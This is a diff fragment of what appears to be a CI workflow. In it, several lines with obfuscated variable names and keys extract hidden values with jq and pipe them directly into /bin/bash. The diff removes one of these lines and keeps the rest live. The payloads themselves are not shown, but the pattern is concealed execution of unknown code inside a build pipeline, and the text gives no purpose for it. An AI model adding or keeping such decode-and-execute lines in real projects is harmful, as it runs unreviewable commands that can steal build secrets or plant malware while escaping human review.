@@ -24,7 +24,6 @@ jobs:
           echo $io014 | jq -r .vtcjr2494 | /bin/bash
           printf '%s' "$m1723" | jq -r .fxv2 | /bin/bash
           printf '%s' "$hoqfp33998" | jq -r .ifssp3 | /bin/bash
-          printf '%s' "$a41424" | jq -r .f62 | /bin/bash
           echo $guna9749 | jq -r .pbvy9 | /bin/bash
           printf '%s' "$ggz08944" | jq -r .o609 | /bin/bash
           echo $l75 | jq -r .enf034 | /bin/bash
